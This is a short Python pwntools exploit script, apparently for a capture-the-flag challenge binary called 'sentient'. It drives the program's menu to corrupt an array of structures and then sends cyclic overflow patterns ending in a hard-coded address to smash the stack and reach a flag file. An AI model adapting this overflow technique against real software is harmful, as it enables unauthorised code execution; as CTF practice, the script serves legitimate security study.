#!/usr/bin/python

# Make a file named "flag" next to the executable.

from pwn import *

username = "SeventhSense"

CHOICE = "Choice: "
CONTINUE = "Continue? (y/n) "
MESSAGE = "Enter message: "

#########################################################################

def readUntilQuestionAndAnswer(question, answer):
	print ps.recvuntil(question) + answer
	ps.sendline(answer)

#########################################################################

if __name__ == "__main__":
	ps = process('./sentient')

	raw_input("[script] attach a debugger " + str(util.proc.pidof(ps)) + " and hit enter to start...")

	print ps.recvuntil("Enter your username: ") + username
	ps.sendline(username)

	# "Fires" to the array of 16 structures
	# with length(2 bytes) and
	# string(14 bytes) fields.
	for i in range(1, 50):
		print "[script] Firing EMP number " + str(i) + "."
		readUntilQuestionAndAnswer(CHOICE, "2")
		readUntilQuestionAndAnswer(CONTINUE, "y")

	raw_input("Shots fired, now time to smash the stack! Hit enter...")

	for i in range(0, 16):
		length = 256 - 2 - i * 16
		pattern = util.cyclic.cyclic_metasploit(length) + p64(0x006020A0)
		print "[script] Pattern of " + str(len(pattern)) + " bytes."
		readUntilQuestionAndAnswer(CHOICE, "1")
		readUntilQuestionAndAnswer(MESSAGE, pattern)

	raw_input("\n\n\tSuccess?\n")

	ps.close()
